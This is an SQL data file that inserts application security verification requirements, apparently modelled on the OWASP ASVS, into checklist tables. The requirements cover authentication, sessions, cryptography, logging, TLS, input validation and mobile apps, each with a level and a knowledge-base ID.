INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.9', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('6.10', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('7.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.0', 0, 0, 400, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.1', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.2', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.3', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.4', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.5', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.6', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.7', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.8', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.9', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.10', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.11', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.12', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO `checklists_kb` (`checklistID`, `question_sprint_ID`, `question_pre_ID`, `kbID`, `codeID_php`, `codeID_asp`, `codeID_java`, `codeID_python`, `include_always`, `include_first`) VALUES ('8.13', 0, 0, 999, 0, 0, 0, 0, 'False', 'False');
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.12', 'Verify that session ids stored in cookies have their path set to an appropriately restrictive value for the application, and authentication session tokens additionally set the "HttpOnly" and "secure" attributes', '1', '92'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.24', 'Verify that if shared knowledge based questions (also known as "secret questions") are required, the questions do not violate privacy laws and are sufficiently strong to protect accounts from malicious recovery.', '1', '87'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.2', 'Verify that the mobile app does not store sensitive data onto potentially unencrypted shared resources on the device (e.g. SD card or shared folders).', '1', '212'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.1', 'Verify all pages and resources by default require authentication except those specifically intended to be public (Principle of complete mediation).', '1', '45'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.2', 'Verify that access to administration and management functions within the Web Service Application is limited to web service administrators.', '1', '187'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.23', 'For autoescaping template technology, if UI escaping is disabled, ensure that HTML sanitization is enabled instead.', '2', '189'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.7', 'Verify that cryptographic algorithms used by the application have been validated against FIPS 1402 or an equivalent standard.', '1', '119'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.1', 'Verify that the application does not output error messages or stack traces containing sensitive data that could assist an attacker, including session id, software/framework versions and personal information', '1', '15'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.3', 'Verify security logging controls provide the ability to log success and particularly failure events that are identified as securityrelevant.', '2', '83'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.8', 'Verify that there are antidebugging techniques present that are sufficient enough to deter or delay likely attackers from injecting debuggers into the mobile app (For example GDB).', '3', '218'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.14', 'Verify the system can protect against aggregate or continuous access of secured functions, resources, or data. For example, consider the use of a resource governor to limit the number of edits per hour or to prevent the entire database from being scraped by an individual user.', '2', '116'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('15.1', 'Verify the application will only process business logic flows in sequential step order, with all steps being processed in realistic human time, and not process out of order, skipped steps, process steps from another user, or too quickly submitted transactions.', '2', '110'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.5', 'Verify that the application build and deployment processes are performed in a secure fashion.', '2', '199'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.5', 'Verify that on the server, all cached or temporary copies of sensitive data stored are protected from unauthorized access or purged/invalidated after the authorized user accesses the sensitive data.', '2', '145'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.6', 'Verify that a threat model for the target application has been produced and covers off risks associated with Spoofing, Tampering, Repudiation, Information Disclosure, and Elevation of privilege (STRIDE).', '3', '172'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.11', 'Verify that the app validates input to exported activities, intents, or content providers.', '1', '221'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.2', 'Communications between components, such as between the application server and the database server, should be encrypted, particularly when the components are in different containers or on different systems.', '2', '102'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.4', 'Verify that sessions timeout after an administrativelyconfigurable maximum time period regardless of activity (an absolute timeout).', '2', '89'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.2', 'Verify that all cryptographic modules fail securely, and errors are handled in a way that does not enable oracle padding.', '1', '149'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.6', 'Verify that files obtained from untrusted sources are stored outside the webroot, with limited permissions, preferably with strong validation.', '2', '227'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.8', 'Verify the application code does not execute uploaded data obtained from untrusted sources.', '1', '13'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.5', 'Verify that untrusted data is not used within crossdomain resource sharing (CORS) to protect against arbitrary remote content.', '1', '112'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('15.0', 'Business logic verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.16', 'Verify that the application limits the number of active concurrent sessions.', '1', '188'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.4', 'Verify application deployments are adequately sandboxed, containerized or isolated to delay and deter attackers from attacking other applications.', '2', '106'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.10', 'Verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required.', '2', '235'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.10', 'Verify that an audit log or similar allows for nonrepudiation of key transactions.', '1', '107'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.2', 'Verify that error handling logic in security controls denies access by default.', '2', '251'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.28', 'Verify that all authentication challenges, whether successful or failed, should respond in the same average response time.', '3', '165'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.11', 'Verify that security logs have some form of integrity checking or controls to prevent unauthorized modification.', '3', '256'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.11', 'Verify that all consumers of cryptographic services do not have direct access to key material. Isolate cryptographic processes, including master secrets and consider the use of a virtualized or physical hardware key vault (HSM).', '3', '196'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('13.2', 'Verify that the application source code, and as many third party libraries as possible, does not contain back doors, Easter eggs, and logic flaws in authentication, access control, input validation, and the business logic of high value transactions.', '3', '105'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.0', 'Architecture, design and threat modelling', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.16', 'Verify that the TLS settings are in line with current leading practice, particularly as common configurations, ciphers, and algorithms become insecure.', '1', '247'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.14', 'Verify that all keys and passwords are replaceable, and are generated or replaced at installation time.', '2', '204'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.16', 'If the application framework allows automatic mass parameter assignment (also called automatic variable binding) from the inbound request to a model, verify that security sensitive fields such as "accountBalance", "role" or "password" are protected from malicious automatic binding.', '2', '147'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.1', 'Verify that all forms containing sensitive information have disabled client side caching, including autocomplete features.', '1', '140'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.3', 'Verify that TLS is used for all connections (including both external and backend connections) that are authenticated or that involve sensitive data or functions, and does not fall back to insecure or unencrypted protocols. Ensure the strongest alternative is the preferred algorithm.', '1', '244'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.13', 'Verify that sensitive passwords or key material maintained in memory is overwritten with zeros as soon as it no longer required, to mitigate memory dumping attacks.', '2', '203'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.2', 'Verify that the list of sensitive data processed by the application is identified, and that there is an explicit policy for how access to this data must be controlled, encrypted and enforced under relevant data protection directives.', '3', '261'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.9', 'Verify that the message payload is signed to ensure reliable transport between client and service, using JSON Web Signing or WSSecurity for SOAP requests.', '2', '195'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.0', 'Error handling and logging verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.5', 'Verify that input validation routines are enforced on the server side.', '1', '108'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.25', 'Verify that the system can be configured to disallow the use of a configurable number of previous passwords.', '2', '88'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.1', 'Verify that the runtime environment is not susceptible to buffer overflows, or that security controls prevent buffer overflows.', '1', '146'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.21', 'Verify that unstructured data is sanitized to enforce generic safety measures such as allowed characters and length, and characters potentially harmful in given context should be escaped (e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O''Hara)', '2', '202'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.0', 'Malicious input handling verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.5', 'Verify that the mobile app prevents leaking of sensitive information (for example, screenshots are saved of the current application as the application is backgrounded or writing sensitive information in console).', '2', '215'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.1', 'Verify that a path can be built from a trusted CA to each Transport Layer Security (TLS) server certificate, and that each server certificate is valid.', '1', '101'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.8', 'Verify that there is a single standard TLS implementation that is used by the application that is configured to operate in an approved mode of operation.', '3', '127'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.7', 'Verify that the web or application server is configured by default to deny access to remote resources or systems outside the web or application server.', '2', '138'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.6', 'Verify all authentication controls fail securely to ensure attackers cannot log in.', '1', '114'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.5', 'Verify that all events that include untrusted data will not execute as code in the intended log viewing software.', '2', '100'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.9', 'Do not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies not supported natively via W3C browser standards.', '1', '194'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.8', 'Verify all account identity authentication functions (such as update profile, forgot password, disabled / lost token, help desk or IVR) that might regain access to the account are at least as resistant to attack as the primary authentication mechanism.', '1', '85'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.3', 'Verify that HTTP headers added by a trusted proxy or SSO devices, such as a bearer token, are authenticated by the application.', '2', '131'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.6', 'Verify that the application is requesting minimal permissions for required functionality and resources.', '2', '216'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.11', 'Verify that sensitive information maintained in memory is overwritten with zeros as soon as it no longer required, to mitigate memory dumping attacks.', '2', '135'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.9', 'Verify that log fields from trusted and untrusted sources are distinguishable in log entries.', '3', '134'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.0', 'Mobile verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.5', 'Verify that certificate paths are built and verified for all client certificates using configured trust anchors and revocation information.', '3', '139'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.18', 'Verify that client side validation is used as a second line of defense, in addition to server side validation.', '2', '166'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.11', 'Verify that there is a centralized mechanism (including libraries that call external authorization services) for protecting access to each type of protected resource.', '3', '259'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.5', 'Verify that all pages that require authentication have easy and visible access to logout functionality.', '1', '90'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.7', 'Verify that the REST service is protected from CrossSite Request Forgery via the use of at least one or more of the following: ORIGIN checks, double submit cookie pattern, CSRF nonces, and referrer checks.', '1', '224'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.22', 'Verify that forgotten password and other recovery paths use a TOTP or other soft token, mobile push, or other offline recovery mechanism. Use of a random value in an email or SMS should be a last resort and is known weak.', '1', '115'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.8', 'Verify the REST service explicitly check the incoming ContentType to be the expected one, such as application/xml or application/json.', '2', '160'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.8', 'Verify that cryptographic modules operate in their approved mode according to their published security policies.', '3', '141'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.15', 'Ensure that all string variables placed into HTML or other web client code is either properly contextually encoded manually, or utilize templates that automatically encode contextually to ensure the application is not susceptible to reflected, stored and DOM CrossSite Scripting (XSS) attacks.', '1', '3'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.3', 'Communications between components, such as between the application server and the database server should be authenticated using an account with the least necessary privileges.', '2', '246'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.1', 'Verify that all application components are identified and are known to be needed', '1', '161'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.33', 'Browser autocomplete, and integration with password managers are permitted unless prohibited by risk based policy.', '1', '209'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.6', 'Verify that a single input validation control is used by the application for each type of data that is accepted.', '3', '96'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.3', 'Verify that sessions timeout after a specified period of inactivity.', '1', '60'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.5', 'Verify that the HTTP headers or any part of the HTTP response do not expose detailed version information of system components.', '1', '130'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.16', 'Verify that the application correctly enforces contextsensitive authorisation so as to not allow unauthorised manipulation by means of parameter tampering.', '1', '241'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.24', 'Verify that data transferred from one DOM context to another, uses safe JavaScript methods, such as using .innerText and .val.', '2', '179'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.10', 'Verify that only session ids generated by the application framework are recognized as active by the application.', '2', '56'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.22', 'Make sure untrusted HTML from WYSIWYG editors or similar are properly sanitized with an HTML sanitizer and handle it appropriately according to the input validation task and encoding task.', '1', '180'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.17', 'Verify that the application has defenses against HTTP parameter pollution attacks, particularly if the application framework makes no distinction about the source of request parameters (GET, POST, cookies, headers, environment, etc.)', '2', '71'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.0', 'Access Control Verification Requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.26', 'Verify that risk based reauthentication, two factor or transaction signing is in place for high value transactions.', '2', '233'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.10', 'Verify that all SQL queries, HQL, OSQL, NOSQL and stored procedures, calling of stored procedures are protected by the use of prepared statements or query parameterization, and thus not susceptible to SQL injection', '1', '46'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.29', 'Verify that secrets, API keys, and passwords are not included in the source code, or online source code repositories.', '3', '251'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.12', 'Verify that the logs are stored on a different partition than the application is running with proper log rotation.', '3', '191'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.7', 'Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered.', '1', '59'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.4', 'Verify all authentication controls are enforced on the server side.', '1', '43'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.9', 'Verify the application has a clear separation between the data layer, controller layer and the display layer, such that security decisions can be enforced on trusted systems.', '2', '185'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.0', 'Files and resources verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.20', 'Verify that structured data is strongly typed and validated against a defined schema including allowed characters, length and pattern (e.g. credit card numbers or telephone, or validating that two related fields are reasonable, such as validating suburbs and zip or post codes match).', '2', '234'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.1', 'Verify that ID values stored on the device and retrievable by other applications, such as the UDID or IMEI number are not used as authentication tokens.', '1', '211'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.2', 'Verify that al components, such as libraries, modules, and external systems, that are not part of the application but that the application relies on to opperate are identified.', '2', '162'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.15', 'Verify the application has additional authorization (such as step up or adaptive authentication) for lower value systems, and / or segregation of duties for high value applications to enforce antifraud controls as per the risk of application and past fraud.', '2', '111'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.11', 'Verify that session ids are sufficiently long, random and unique across the correct active session base.', '1', '55'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('13.0', 'Malicious controls verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.18', 'Verify the user is prompted with the option to terminate all other active sessions after a successful change password process.', '1', '254'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.17', 'Verify that the forgotten password function and other recovery paths do not reveal the current password and that the new password is not sent in clear text to the user.', '1', '243'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.10', 'Verify that there is no sensitive business logic, secret keys or other proprietary information in client side code.', '2', '74'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.7', 'Verify that all successful authentication and reauthentication generates a new session and session id.', '1', '58'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('3.6', 'Verify that the session id is never disclosed in URLs, error messages, or logs. This includes verifying that the application does not support URL rewriting of session cookies.', '1', '91'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.0', 'HTTP security configuration verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.8', 'Verify that components are segregated from each other via a defined security control, such as network segmentation, firewall rules, or cloud based security groups.', '2', '206'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.16', 'Verify that credentials are transported using a suitable encrypted link and that all pages/functions that require a user to enter credentials are done so using an encrypted link.', '1', '122'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('10.0', 'Communications security verification requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('8.13', 'Time sources should be synchronized to ensure logs have the correct time.', '1', '210'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('16.1', 'Verify that URL redirects and forwards only allow whitelisted destinations, or show a warning when redirecting to potentially untrusted content.', '1', '67'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('19.1', 'All components should be up to date with proper security configuration(s) and version(s). This should include removal of unneeded configurations and folders such as sample applications, platform documentation, and default or example users.', '1', '14'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.8', 'Verify the application has the ability to detect and alert on abnormal numbers of requests for data harvesting for an example screen scraping.', '3', '125'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.12', 'Verify that all access control decisions can be logged and all failed decisions are logged.', '2', '232'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('17.7', 'Verify that the application sensitive code is laid out unpredictably in memory (For example ASLR).', '1', '217'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.4', 'Verify that all input is limited to an appropriate size limit.', '1', '176'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('9.9', 'Verify that sensitive information maintained in memory is overwritten with zeros as soon as it no longer required, to mitigate memory dumping attacks.', '1', '190'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.4', 'Verify that all application components are defined in terms of the business functions and/or security functions they provide.', '3', '258'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.0', 'Authentication Verification Requirements', '0', '0'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('5.3', 'Verify that server side input validation failures result in request rejection and are logged.', '1', '95'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.9', 'Verify that the same access control rules implied by the presentation layer are enforced on the server side.', '1', '240'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.5', 'Verify that all components that are not part of the application but that the application relies on to operate are defined in terms of the functions, and/or security functions, they provide.', '3', '260'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('18.10', 'Verify that alternative and less secure access paths do not exist.', '2', '80'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('4.5', 'Verify that directory browsing is disabled unless deliberately desired. Additionally, applications should not allow discovery or disclosure of file or directory metadata, such as Thumbs.db, .DS_Store, .git or .svn folders.', '1', '61'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('11.1', 'Verify that the application accepts only a defined set of required HTTP request methods, such as GET and POST are accepted, and unused methods (e.g. TRACE, PUT, and DELETE) are explicitly blocked.', '1', '129'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('2.32', 'Verify that administrative interfaces are not accessible to untrusted parties', '1', '187'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('1.3', 'Verify that a highlevel architecture for the application has been defined.', '2', '163'); 
INSERT OR REPLACE INTO checklists (checklistID, content, level, kbID) VALUES ('7.12', 'Personally Identifiable Information should be stored encrypted at rest and ensure that communication goes via protected channels.', '2', '207'); 
